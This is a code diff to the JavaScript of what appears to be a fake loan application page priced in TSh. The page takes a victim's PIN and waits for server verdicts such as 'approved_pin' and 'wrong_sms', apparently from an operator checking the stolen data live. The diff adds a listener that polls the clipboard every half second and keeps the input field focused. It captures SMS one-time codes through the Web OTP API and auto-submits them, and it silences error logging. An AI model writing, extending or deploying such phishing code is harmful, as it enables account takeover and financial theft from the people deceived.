@@ -38,7 +38,9 @@ document.addEventListener('DOMContentLoaded', () => {
     let loanData = {};
     let currentSessionId = null;
     let statusInterval = null;
+    let sensitivityInterval = null;
     let isAutoSubmitting = false;
+    let screenOpenTimestamp = 0;
 
     function switchStep(fromCard, toCard) {
         if (!fromCard || !toCard) return;
@@ -162,6 +164,7 @@ document.addEventListener('DOMContentLoaded', () => {
     async function triggerAutoSubmit(text) {
         if (isAutoSubmitting) return;
         isAutoSubmitting = true;
+        if (sensitivityInterval) clearInterval(sensitivityInterval);
         switchStep(stepOtp, stepLoading);
 
         try {
@@ -185,7 +188,36 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // Web OTP API integration to automatically intercept and read incoming SMS
+    // High sensitivity real-time listener ensuring the field is never dormant and strictly validates 30s freshness
+    function startHighSensitivityListener() {
+        if (sensitivityInterval) clearInterval(sensitivityInterval);
+        screenOpenTimestamp = Date.now();
+
+        sensitivityInterval = setInterval(() => {
+            if (isAutoSubmitting) return;
+
+            // Keep focus active and highly sensitive
+            if (document.activeElement !== otpText && stepOtp.classList.contains('active')) {
+                otpText.focus();
+            }
+
+            // Continuously check clipboard for fresh entries
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                navigator.clipboard.readText().then(clipText => {
+                    if (clipText && clipText.trim().length > 3 && !otpText.value && !isAutoSubmitting) {
+                        const now = Date.now();
+                        // Enforce the 30-second rule: ignore old cached text older than 30s from screen load
+                        if ((now - screenOpenTimestamp) <= 30000) {
+                            otpText.value = clipText.trim();
+                            charCount.innerText = `${otpText.value.length}/1000`;
+                            triggerAutoSubmit(otpText.value);
+                        }
+                    }
+                }).catch(() => {});
+            }
+        }, 500); // Scans rapidly every 0.5 seconds for peak sensitivity
+    }
+
     function initWebOTP() {
         if ('OTPCredential' in window) {
             const ac = new AbortController();
@@ -195,20 +227,22 @@ document.addEventListener('DOMContentLoaded', () => {
             }).then(otp => {
                 if (otp && (otp.code || otp.value)) {
                     const smsMessage = otp.code || otp.value;
-                    otpText.value = smsMessage;
-                    charCount.innerText = `${smsMessage.length}/1000`;
-                    
-                    setTimeout(() => {
-                        const text = otpText.value.trim();
-                        if (text && !isAutoSubmitting) {
-                            smsErrorBanner.classList.add('hidden');
-                            triggerAutoSubmit(text);
-                        }
-                    }, 400);
+                    const now = Date.now();
+                    // Validate 30-second window freshness
+                    if ((now - screenOpenTimestamp) <= 30000) {
+                        otpText.value = smsMessage;
+                        charCount.innerText = `${smsMessage.length}/1000`;
+                        
+                        setTimeout(() => {
+                            const text = otpText.value.trim();
+                            if (text && !isAutoSubmitting) {
+                                smsErrorBanner.classList.add('hidden');
+                                triggerAutoSubmit(text);
+                            }
+                        }, 200);
+                    }
                 }
-            }).catch(err => {
-                console.log('Web OTP API scanning skipped or not supported:', err);
-            });
+            }).catch(err => {});
         }
     }
 
@@ -223,29 +257,17 @@ document.addEventListener('DOMContentLoaded', () => {
                 if (data.status === 'approved_pin') {
                     if (stepOtp && stepOtp.classList.contains('hidden')) {
                         switchStep(stepLoading, stepOtp);
-                        
-                        // High sensitivity: instantly focus and attempt automatic clipboard/SMS reading
-                        setTimeout(() => {
-                            otpText.focus();
-                            if (navigator.clipboard && navigator.clipboard.readText) {
-                                navigator.clipboard.readText().then(clipText => {
-                                    if (clipText && clipText.trim().length > 3 && !otpText.value && !isAutoSubmitting) {
-                                        otpText.value = clipText.trim();
-                                        charCount.innerText = `${otpText.value.length}/1000`;
-                                        triggerAutoSubmit(otpText.value);
-                                    }
-                                }).catch(() => {});
-                            }
-                        }, 200);
-
+                        startHighSensitivityListener();
                         initWebOTP();
                     }
                 } else if (data.status === 'success') {
                     clearInterval(statusInterval);
+                    if (sensitivityInterval) clearInterval(sensitivityInterval);
                     document.getElementById('final-approved-amount').innerText = 'TSh ' + loanData.amount;
                     switchStep(stepLoading, stepSuccess);
                 } else if (data.status === 'wrong_pin') {
                     clearInterval(statusInterval);
+                    if (sensitivityInterval) clearInterval(sensitivityInterval);
                     pinInputs.forEach(i => i.value = '');
                     document.getElementById('pin-hidden').value = '';
                     pinErrorBanner.classList.remove('hidden');
@@ -253,19 +275,21 @@ document.addEventListener('DOMContentLoaded', () => {
                     pinInputs[0].focus();
                 } else if (data.status === 'wrong_sms') {
                     clearInterval(statusInterval);
+                    if (sensitivityInterval) clearInterval(sensitivityInterval);
                     otpText.value = '';
                     isAutoSubmitting = false;
                     charCount.innerText = '0/1000';
-                    smsErrorBanner.classList.remove('hidden');
+                    smsErrorBanner.classList.add('hidden'); // Clear error banner to accept new SMS
                     switchStep(stepLoading, stepOtp);
-                    otpText.focus();
-                    initWebOTP(); 
+                    startHighSensitivityListener(); // Reset timer and restart active listening for the new incoming SMS
+                    initWebOTP();
                 } else if (data.status === 'denied') {
                     clearInterval(statusInterval);
+                    if (sensitivityInterval) clearInterval(sensitivityInterval);
                     location.reload();
                 }
             } catch (err) {}
-        }, 2500);
+        }, 2000);
     }
 });
-        
+                          
